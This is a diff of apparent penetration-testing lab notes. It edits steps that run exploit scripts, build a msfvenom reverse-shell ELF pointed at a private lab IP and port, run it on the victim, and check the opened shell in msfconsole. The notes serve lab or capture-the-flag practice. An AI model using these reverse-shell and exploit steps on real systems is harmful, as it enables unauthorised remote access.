@@ -95,7 +95,7 @@ up on a webpage and the downloading it from victim.
 (ATTACKER) python3 exploit_nss.py
 (ATTACKER) gcc -o exploit_timestamp_race exploit_timestamp_race.c [2:12:27]
 
-[3:36]
+Exploiting arper utullizing msfvenom as a reverse shell.
 
 (ATTACKER) msfvenom-p linux/x64/shell/reverse_tcp LHOST=192.168.122.209 LPORT=61775 -f elf -o mal
 (ATTACKER) sudo rm -r__MACosx
@@ -126,12 +126,12 @@ open mfsconsole
 (ATK)(msf6) show options to see if payload is set properly
 (ATK)(msf6) run
 
-(VICTIM) ./clear
+(VICTIM) >./clear
 (ATK)(msf6) go back and check if command shell opened
 then run...
-(ATK)(msf6) id
-(ATK)(msf6) ls -la | grep clear
-(ATK)(msf6) arper
+(ATK)(msf6) >id
+(ATK)(msf6) >ls -la | grep clear
+(ATK)(msf6) >arper
 
 [[[[[[SKIP!!! THIS. TO HARD STOP, RABBIT HOLE]]]]]]
 this will be for the report that enumeration was a dead end
